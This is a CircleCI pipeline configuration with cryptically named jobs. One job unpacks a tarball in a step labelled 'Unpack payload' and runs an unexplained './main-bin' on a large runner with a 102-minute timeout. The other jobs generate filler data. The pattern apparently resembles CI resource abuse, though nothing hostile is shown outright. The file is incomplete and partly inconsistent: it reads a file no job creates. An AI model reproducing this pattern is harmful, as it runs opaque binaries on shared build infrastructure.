version: 2.1

jobs:
  postbuild_foxtrot:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: nova spark
          command: |
            mkdir -p /tmp/ci-ws
            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/ci-ws/buffer.dat
            echo "gate foxtrot: $(wc -c </tmp/ci-ws/buffer.dat) bytes total"
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - buffer.dat
  foxtrot:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Pick up handoff
          command: |
            cat /tmp/ci-ws/FINAL.txt
      - run:
          name: Retrieve repository
          command: git clone --depth 2 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack payload
          command: tar -xf deps.tar
      - run:
          name: Cooldown
          command: sleep 30
      - run:
          command: free -m
      - run:
          name: Finalize build
          command: sleep 30
      - run:
          no_output_timeout: 102m
          command: nice -n 0 ./main-bin
  D_sanity:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: noise floor
          command: |
            mkdir -p /tmp/ci-ws
            { set +o pipefail 2>/dev/null; tf=$(mktemp) && head -c 1024 /dev/urandom > "$tf" && sha1sum "$tf" | cut -d' ' -f1 && rm "$tf"; true ; } > /tmp/ci-ws/handoff.state
            echo "gate sanity: $(wc -c </tmp/ci-ws/handoff.state) bytes total"
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - handoff.state
  sanity:
